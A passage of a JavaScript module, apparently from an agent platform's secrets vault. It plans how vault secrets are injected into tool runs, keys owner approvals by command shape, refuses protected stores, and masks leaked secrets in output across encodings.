    if (sc.refs.length && !r) return refuse('bad_reference', { text: v.slice(0, 80), why: 'an env value is one whole reference (a template file holds the rest)' });
    const no = claim(n, r ? 'env' : 'plain');
    if (no) return no;
    if (r) { env.push({ name: n, ref: add(r) }); injection.push(`env:${n}`); } else plainEnv.push({ name: n, value: v });
  }
  for (const [n, v] of pairsOf(req.file)) {
    const no = claim(n, 'file');
    if (no) return no;
    if (v.startsWith('@')) {
      const p = v.slice(1), t = req.templates && Object.prototype.hasOwnProperty.call(req.templates, p) ? req.templates[p] : null;
      if (!p) return refuse('bad_flag', { flag: '--file' });
      if (typeof t !== 'string') return refuse('template_unread', { template: p });
      if (bytesOf(t) > TEMPLATE_MAX) return refuse('template_too_long', { template: p });
      const sc = scanRefs(t);
      if (sc.bad.length || sc.refs.some((x) => x.form !== 'brace')) return refuse('bad_reference', { text: (sc.bad[0] || sc.refs.find((x) => x.form !== 'brace')).text || '', why: 'a template names a value as $VAULT{<store>/<row>/<field>}' });
      for (const x of sc.refs) add(x);
      files.push({ slot: files.length, name: n, ref: null, template: p, text: t });
    } else {
      const r = parseRef(v);
      if (!r) return refuse('bad_reference', { text: v.slice(0, 80) });
      files.push({ slot: files.length, name: n, ref: add(r), template: null, text: null });
    }
    injection.push(`file:${n}`);
  }
  let stdin = null;
  if (req.stdin != null) { const r = parseRef(String(req.stdin)); if (!r) return refuse('bad_reference', { text: String(req.stdin).slice(0, 80) }); stdin = add(r); injection.push('stdin'); }
  let argvExposed = false;
  for (const a of argv) {
    const sc = scanRefs(a);
    if (sc.bad.length) return refuse('bad_reference', { text: sc.bad[0].text });
    for (const x of sc.refs) {
      if (x.form === 'file' && x.name) { if (!files.some((f) => f.name === x.name)) return refuse('bad_reference', { text: `$VAULT_FILE{${x.name}}`, why: `no --file ${x.name}=… declares it` }); continue; }
      if (x.form === 'file') { const ref = add(x); if (!files.some((f) => f.name === null && f.ref === ref)) { files.push({ slot: files.length, name: null, ref, template: null, text: null }); injection.push('file:$VAULT_FILE'); } continue; }
      const iv = injectionOf('argv', { allowArgv: !!req.allowArgv, row });
      if (!iv.ok) return { ...iv, tool: name };
      add(x); argvExposed = true;
    }
  }
  if (argvExposed) injection.push('argv');
  if (!refs.size) return refuse('no_reference');
  return { ok: true, argv, tool: String(req.resolved || argv[0]), name, kind: toolKindOf(name), row, refs: [...refs.values()], env, plainEnv, files, stdin, injection: [...new Set(injection)], argvExposed, on: req.on ? String(req.on) : null, timeoutSec: timeoutOf(req.timeoutSec) || TIMEOUT_DEFAULT_S, programWritable: req.programWritable === true };
}
/** The door's LAST step over planOf's answer (`run`) — the only object that holds values (never stored, never logged): the
 *  child's argv / env / stdin and each file's content. `valueOf(ref)` = the vault's value; `pathOf(slot)` = the door's 0700 run dir + a name. */
function materialize(run, { valueOf, pathOf }) {
  const slotOf = (x) => (run.files.find((f) => (x.name ? f.name === x.name : f.name === null && f.ref === x.ref)) || {}).slot;
  const argv = run.argv.map((a) => {
    const { refs } = scanRefs(a);
    let out = '', i = 0;
    for (const x of refs) { out += a.slice(i, x.at) + (x.form === 'file' ? String(pathOf(slotOf(x))) : run.argvExposed ? String(valueOf(x.ref)) : x.ref); i = x.at + x.len; }
    return out + a.slice(i);
  });
  const env = {};
  for (const e of run.plainEnv) env[e.name] = e.value;
  for (const e of run.env) env[e.name] = String(valueOf(e.ref));
  for (const f of run.files) if (f.name) env[f.name] = String(pathOf(f.slot));
  const files = run.files.map((f) => ({ slot: f.slot, path: String(pathOf(f.slot)), content: f.template != null ? renderTemplate(f.text, valueOf) : String(valueOf(f.ref)) }));
  return { argv, env, files, stdin: run.stdin ? String(valueOf(run.stdin)) + '\n' : null };
}

// ── THE SHAPE KEY (decision ④) ──
const URL_RE = /\b([a-z][a-z0-9+.-]{0,31}):\/\/(?:[^@\s\/?#'"]{0,256}@)?(\[[0-9a-f:.]+\]|[A-Za-z0-9.-]+)(?::(\d{1,5}))?/gi;
const normHost = (h, port = null) => { const x = String(h || '').toLowerCase().replace(/\.$/, ''); return x && x.length <= 253 ? (port ? `${x}:${port}` : x) : null; };
function urlHosts(text) { const out = []; let m; URL_RE.lastIndex = 0; while ((m = URL_RE.exec(String(text)))) if (m[1].toLowerCase() !== 'vault') out.push(normHost(m[2], m[3])); return out.filter(Boolean); }
const HOSTNAME = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$|^localhost$/i;
function argClassOf(a) {
  if (/\$VAULT_FILE\{/.test(a)) return '<vaultfile>';
  if (/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(a)) return '<url>';
  if (/^[+-]?\d+(?:\.\d+)?$/.test(a)) return '<number>';
  if (/[\/\\]|^[.~]/.test(a)) return '<path>';
  return '<word>';
}
/** planOf's answer (`run`) → its SHAPE: { v, tool, name, kind, sub, flags, args, hosts, entries, injection, env (NAME=value), keyed,
 *  templates, on, script, known, proxyEnv, always, noAlways, argvExposed }. `always` = «always» may be offered for it. */
function shapeOf(run) {
  const row = run.row, kind = run.kind, argv = run.argv;
  const flags = new Set(), sub = [], args = [], positionals = [], keyed = [];
  let script = null, afterDashes = false, valueNext = false, keyNext = null, configFile = false;
  const isKeyed = (f) => !!(row && (row.keyed || []).includes(f));
  if (kind !== 'tool') script = JSON.stringify(argv.slice(1));
  else for (const a of argv.slice(1)) {
    if (!afterDashes && a === '--') { afterDashes = true; flags.add('--'); continue; }
    if (!afterDashes && a.length > 1 && a[0] === '-') {
      const eq = a.startsWith('--') ? a.indexOf('=') : -1, f = eq > 0 ? a.slice(0, eq) : a;
      if (row && (row.configFlags || []).includes(f)) configFile = true;
      if (eq > 0) { flags.add(a.slice(0, eq + 1)); if (isKeyed(f)) keyed.push(`${f}=${a.slice(eq + 1)}`); else args.push(argClassOf(a.slice(eq + 1))); } else flags.add(a);
      valueNext = eq < 0 && !!(row && (row.valueFlags || []).concat(row.hostFlags || []).includes(a));
      keyNext = valueNext && isKeyed(a) ? a : null;
      continue;
    }
    const wasValue = valueNext; valueNext = false;
    if (wasValue && keyNext) { keyed.push(`${keyNext}=${a}`); keyNext = null; continue; }   // a routing flag's value IS the shape (ssh -o ProxyCommand=…)
    if (!wasValue && row && row.sub && sub.length < row.sub && !positionals.length && /^[a-z][a-z0-9-]{0,40}$/.test(a)) { sub.push(a); continue; }
    args.push(argClassOf(a));
    if (!wasValue) positionals.push(a);
  }
  // THE HOSTS: every URL anywhere (the command, the plain env values, the templates) + the row's own rules; its defaults when none
  const hosts = new Set([...argv.slice(1), ...run.plainEnv.map((e) => e.value), ...run.files.map((f) => f.text || '')].flatMap(urlHosts));
  if (row && kind === 'tool') {
    const all = argv.slice(1);
    if (row.scpLike) for (const a of positionals) { const m = /^(?:[\w.+-]+@)?([A-Za-z0-9.-]{2,253}):(?!\/\/)/.exec(a); if (m && !/^[A-Za-z]$/.test(m[1])) hosts.add(normHost(m[1])); }
    if (row.sshTarget && positionals.length) { const m = /^(?:[\w.+-]+@)?([A-Za-z0-9.-]{1,253})$/.exec(positionals[0]); if (m) hosts.add(normHost(m[1])); }
    if (row.hostFlags) all.forEach((a, i) => { const eq = a.indexOf('='); if (row.hostFlags.includes(a) && all[i + 1]) hosts.add(normHost(all[i + 1])); else if (eq > 0 && row.hostFlags.includes(a.slice(0, eq))) hosts.add(normHost(a.slice(eq + 1))); });
    if (row.registry) for (const a of positionals) { const h = a.split('/')[0]; if (HOSTNAME.test(h.replace(/:\d+$/, ''))) hosts.add(normHost(h)); }
    if (row.hostEnv) for (const e of run.plainEnv) if ([].concat(row.hostEnv).includes(e.name) && e.value) hosts.add(normHost(e.value));
    if (!hosts.size && row.hosts) row.hosts.forEach((h) => hosts.add(h));
  }
  hosts.delete(null);
  const known = !!row && kind === 'tool';
  const noAlways = kind !== 'tool' ? kind : !known || !hosts.size ? 'unknown-destination' : row.runsProject ? 'runs-project-code' : configFile ? 'config-file' : run.programWritable ? 'program-writable' : null;
  return {
    v: SHAPE_V, tool: run.tool, name: run.name, kind, sub, flags: [...flags].sort(), args, hosts: [...hosts].sort(),
    entries: run.refs.map((r) => r.ref).sort(), injection: [...run.injection].sort(), env: run.plainEnv.map((e) => `${e.name}=${e.value}`).sort(), keyed: keyed.sort(),
    templates: run.files.filter((f) => f.text != null).map((f) => `${f.name}=${f.text}`).sort(), on: run.on || null, script,
    known, proxyEnv: !!(known && row.proxyEnv), always: !noAlways, noAlways, argvExposed: !!run.argvExposed,
  };
}
/** THE KEY a remembered «always» is stored under — everything decision ④ says, nothing positional. */
const shapeKeyOf = (s) => `${SHAPE_V}:${JSON.stringify([s.tool, s.sub, s.flags, s.args, s.hosts, s.entries, s.injection, s.env, s.templates, s.on, s.script, s.keyed])}`;

// ── WHICH ENTRIES A RUN MAY NEVER REFERENCE (each has its own door; the owner opens the rest one by one) ──
const OWN_DOORS = Object.freeze([
  Object.freeze({ store: 'accounts', door: 'the account pool — a conversation on that account already runs with it' }),
  Object.freeze({ store: 'integrations', door: 'the channel\'s raw API — vibespace-channels api' }),
  Object.freeze({ store: 'channels', door: 'the channel\'s own doors — vibespace-channels (send, api)' }),
  Object.freeze({ store: 'passkeys', door: 'the agent browser\'s passkey ceremony' }),
  Object.freeze({ store: 'automation', door: 'the Vault window, to hand to an outside party — VibeSpace\'s own key never goes into a run' }),
  Object.freeze({ store: 'secrets', entry: /^host:/, door: 'the machine\'s link (Remote) — a link token runs commands on that machine' }),
  Object.freeze({ store: 'secrets', entry: /^frp:/, door: 'the relay (the frp plugin) uses it itself' }),
  Object.freeze({ store: 'secrets', door: 'VibeSpace uses it itself' }),
]);
const RUNNABLE_STORES = Object.freeze(['mounts', 'app-secrets']);
/** A reference → the door it has instead (words), or null when the owner may open it for runs. A store this table does not
 *  know has no run door (fails closed). */
function ownDoorOf(ref) {
  if (!ref) return 'no run door';
  if (isAgentEntry(ref.store, ref.entry, ref.field)) return null;   // lane vault-run-door: an AGENT's own entry (mint / put) — the owner opens it like any other; only its conversation references it
  const d = OWN_DOORS.find((x) => x.store === ref.store && (!x.entry || x.entry.test(ref.entry)));
  return d ? d.door : RUNNABLE_STORES.includes(ref.store) ? null : 'no run door (a store the run table does not know)';
}

// ── THE VERDICT (§8.3) ──
/**
 * → { ok: true, by: 'always' | 'instance' } | { ok: false, code, words, … } | { ok: false, ask: true, code: 'ask', offers,
 *   alwaysTtls, alwaysDefault, reauth, ttlMs, noAlways, argvExposed }.
 * `state` the vault's; `plan` planOf's answer; `shape` shapeOf(plan); `entries` [{ id, exists, open, bytes }] (the door's
 * facts — `open` = the owner's «Usable by agent runs», `bytes` = the value's length); `granted` = this conversation may use
 * them (the who-may-use list, P1 vault-use-reach); `remembered` = { until } stored for (conversation, shapeKeyOf(shape));
 * `seen` = the owner allowed this (conversation, shape) once already, this unlock (the door's memory — lane vault-run-door);
 * `instance` 'cluster' | 'local'; `policy` 'ask' | 'allow' | null (null = the instance's: a cluster asks EVERY time, a local one
 * asks the first time and allows a SEEN shape — decision ②: «a new shape asks; a local instance allows after one 允许»).
 */
function runVerdict({ state, plan, shape = null, entries = [], granted = false, remembered = null, seen = false, instance = 'local', policy = null, now = Date.now() } = {}) {
  if (state === 'not_set_up') return refuse('vault_not_set_up');
  if (state !== 'unlocked') return refuse('vault_locked');
  if (!plan || !plan.ok) return plan && plan.code ? plan : refuse('bad_flag');
  const sh = shape || shapeOf(plan);
  const facts = new Map((Array.isArray(entries) ? entries : []).filter((e) => e && e.id).map((e) => [e.id, e]));
  for (const r of plan.refs) {
    const door = ownDoorOf(r);
    if (door) return refuse('entry_has_its_own_door', { ref: r.ref, door, words: `${WORDS.entry_has_its_own_door}: ${door}` });
    const e = facts.get(r.id);
    if (!e || !e.exists) return refuse('entry_unknown', { ref: r.ref });
    if (e.open !== true) return refuse('entry_not_runnable', { ref: r.ref });
    if (!(Number(e.bytes) >= MIN_MASK_BYTES)) return refuse('entry_too_short_to_mask', { ref: r.ref });
  }
  if (granted !== true) return refuse('use_not_granted');
  if (sh.always && remembered && (remembered.until == null || Number(remembered.until) > now)) return { ok: true, by: 'always' };
  const mode = policy === 'ask' || policy === 'allow' ? policy : instance === 'cluster' ? 'ask' : 'allow';
  if (mode === 'allow' && seen === true) return { ok: true, by: 'seen' };   // a NEW shape always draws the card (lane vault-run-door's mutant)
  return { ok: false, ask: true, code: 'ask', offers: sh.always ? ['once', 'always', 'deny'] : ['once', 'deny'], alwaysTtls: sh.always ? Object.keys(ALWAYS_TTLS) : [], alwaysDefault: sh.always ? ALWAYS_DEFAULT : null, reauth: sh.always, ttlMs: ASK_TTL_MS, noAlways: sh.noAlways, argvExposed: sh.argvExposed };
}

// ── THE SCRUBBER ──
function utf8(s) {
  const out = [];
  for (const ch of String(s)) {
    const c = ch.codePointAt(0);
    if (c < 0x80) out.push(c);
    else if (c < 0x800) out.push(0xc0 | (c >> 6), 0x80 | (c & 63));
    else if (c < 0x10000) out.push(0xe0 | (c >> 12), 0x80 | ((c >> 6) & 63), 0x80 | (c & 63));
    else out.push(0xf0 | (c >> 18), 0x80 | ((c >> 12) & 63), 0x80 | ((c >> 6) & 63), 0x80 | (c & 63));
  }
  return out;
}
const B64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
function b64(bytes) {
  let s = '';
  for (let i = 0; i < bytes.length; i += 3) {
    const n = (bytes[i] << 16) | ((bytes[i + 1] || 0) << 8) | (bytes[i + 2] || 0), k = bytes.length - i;
    s += B64[(n >> 18) & 63] + B64[(n >> 12) & 63] + (k > 1 ? B64[(n >> 6) & 63] : '=') + (k > 2 ? B64[n & 63] : '=');
  }
  return s;
}
const urlSafe = (s) => s.replace(/\+/g, '-').replace(/\//g, '_');
function base64Forms(bytes) {
  const full = b64(bytes), out = [];
  for (const f of [full, full.replace(/=+$/, '')]) out.push(['base64', f], ['base64', urlSafe(f)]);
  for (let k = 0; k < 3; k++) {   // inside a longer base64 run the value starts at byte k of a group: its OWN characters only
    const run = b64([...new Array(k).fill(0), ...bytes, 0, 0]);
    const core = run.slice(Math.ceil((8 * k) / 6), Math.floor((8 * (k + bytes.length)) / 6));
    out.push(['base64', core], ['base64', urlSafe(core)]);
  }
  return out;
}
const hex2 = (b, up) => { const h = (b < 16 ? '0' : '') + b.toString(16); return up ? h.toUpperCase() : h; };
function percentForms(bytes) {
  const ch = (b) => (b < 128 ? String.fromCharCode(b) : '');
  const unreserved = (b) => b < 128 && /[A-Za-z0-9\-_.~]/.test(ch(b));
  const keeps = [(b) => unreserved(b) || (b < 128 && "!'()*".includes(ch(b))), unreserved, (b) => unreserved(b) || b === 47, (b) => b < 128 && /[A-Za-z0-9*\-_.]/.test(ch(b)), () => false];   // encodeURIComponent · RFC 3986 · a path (Python quote) · a WHATWG form · every byte
  const out = [];
  for (const up of [true, false]) for (const keep of keeps) {
    const s = bytes.map((b) => (keep(b) ? ch(b) : '%' + hex2(b, up))).join('');
    out.push(['percent', s], ['percent', s.replace(/%20/g, '+')]);
  }
  return out;
}
const JSON_SHORT = Object.freeze({ 8: '\\b', 9: '\\t', 10: '\\n', 12: '\\f', 13: '\\r' });
function jsonForms(value) {
  const out = [];
  for (const slash of [false, true]) for (const uni of [null, 'lower', 'upper']) for (const html of [false, true]) {
    const u = (n) => { const h = n.toString(16).padStart(4, '0'); return '\\u' + (uni === 'upper' ? h.toUpperCase() : h); };
    let s = '';
    for (const c of String(value)) {
      const p = c.codePointAt(0);
      if (c === '"') s += '\\"';
      else if (c === '\\') s += '\\\\';
      else if (c === '/' && slash) s += '\\/';
      else if (p < 0x20) s += JSON_SHORT[p] || u(p);
      else if (html && (c === '<' || c === '>' || c === '&')) s += u(p);
      else if (uni && p >= 0x7f) s += p > 0xffff ? u(0xd800 + ((p - 0x10000) >> 10)) + u(0xdc00 + ((p - 0x10000) & 0x3ff)) : u(p);
      else s += c;
    }
    out.push(['json', s]);
  }
  return out;
}
const hexForms = (bytes) => { const lo = bytes.map((b) => hex2(b, false)).join(''); return [['hex', lo], ['hex', lo.toUpperCase()]]; };
const FORMS = Object.freeze(['raw', 'base64', 'percent', 'json', 'hex']);
/** A value → its forms [{ form, text }] (distinct texts, the raw first). */
function formsOf(value) {
  const v = String(value == null ? '' : value), bytes = utf8(v);
  const all = [['raw', v],
    ...base64Forms(bytes),
    ...percentForms(bytes), ...jsonForms(v), ...hexForms(bytes)];
  const seen = new Set(), out = [];
  for (const [form, text] of all) if (text && !seen.has(text)) { seen.add(text); out.push(Object.freeze({ form, text })); }
  return out;
}
const reEscape = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
/**
 * ONE output stream's scrubber (stdout and stderr each their own). `secrets` = [{ ref | label, value }] — `ref` a parsed
 * reference (its placeholder) or `label` the `<store>/<row>/<field>`. → { push(chunk) → text, end() → text, hits, bytes (UTF-8
 * bytes of what it replaced — the audit's count), byForm, window }.
 * `push` answers what is safe to hand on now and keeps back the last `window` (longest form − 1) characters: an occurrence
 * that STARTS before the kept tail is whole in the buffer, one that starts inside it waits for the next chunk (or `end`).
 * Hand it text from a streaming decoder (StringDecoder / TextDecoder { stream: true }) — never bytes cut mid-character.
 * A value under MIN_MASK_BYTES throws `entry_too_short_to_mask` (runVerdict refused it already).
 */
function createMasker(secrets) {
  const table = new Map();
  for (const s of Array.isArray(secrets) ? secrets : []) {
    const v = String(s && s.value != null ? s.value : '');
    if (bytesOf(v) < MIN_MASK_BYTES) { const e = new Error(WORDS.entry_too_short_to_mask); e.code = 'entry_too_short_to_mask'; throw e; }
    const ph = placeholderOf(s.ref && typeof s.ref === 'object' ? s.ref : s.label != null ? { label: s.label } : parseRef(String(s.ref)) || String(s.ref));
    for (const f of formsOf(v)) if (!table.has(f.text)) table.set(f.text, { ph, form: f.form });
  }
  const texts = [...table.keys()].sort((a, b) => b.length - a.length);
  const re = texts.length ? new RegExp(texts.map(reEscape).join('|'), 'g') : null;
  const maxLen = texts.length ? texts[0].length : 1;
  const W = maxLen - 1;
  let held = '';
  const st = { hits: 0, bytes: 0, byForm: {} };
  function run(buf, final) {
    const safe = final ? buf.length : Math.max(0, buf.length - W);
    let out = '', i = 0, m;
    if (re) {
      re.lastIndex = 0;
      while ((m = re.exec(buf)) && m.index < safe) {
        const t = table.get(m[0]);
        out += buf.slice(i, m.index) + t.ph;
        i = m.index + m[0].length;
        st.hits++; st.bytes += bytesOf(m[0]); st.byForm[t.form] = (st.byForm[t.form] || 0) + 1;
      }
    }
    const cut = Math.max(i, safe);
    out += buf.slice(i, cut);
    held = buf.slice(cut);
    return out;
  }
  return {
    push: (chunk) => run(held + String(chunk == null ? '' : chunk), false),
    end: () => run(held, true),
    get hits() { return st.hits; }, get bytes() { return st.bytes; }, get byForm() { return { ...st.byForm }; }, window: W,
  };
}
/** One whole text scrubbed (a card's command, a short output). */
function maskText(text, secrets) { const m = createMasker(secrets); return m.push(text) + m.end(); }

module.exports = {
  SCHEME, MIN_MASK_BYTES, CMD_MAX, TEMPLATE_MAX, TIMEOUT_DEFAULT_S, TIMEOUT_MAX_S, OUTPUT_MAX_BYTES, ASK_TTL_MS, ALWAYS_TTLS, ALWAYS_DEFAULT, SHAPE_V, SHAPE_NOTE, WORDS, refusalOf,
  parseRef, scanRefs, renderTemplate, placeholderOf, agentScopeOf, refFor: refOf,
  INJECTIONS, injectionOf, ENV_HIJACK, ENV_CONFIG, envRefusedOf,
  TOOL_ROWS, SHELLS, INTERPRETERS, KNOWN_TOOLS, toolNameOf, knownToolOf, refusedTool, toolKindOf,
  RUN_FLAGS, parseRunArgs, timeoutOf, planOf, materialize,
  shapeOf, shapeKeyOf, OWN_DOORS, RUNNABLE_STORES, ownDoorOf, runVerdict,
  FORMS, formsOf, createMasker, maskText,
};
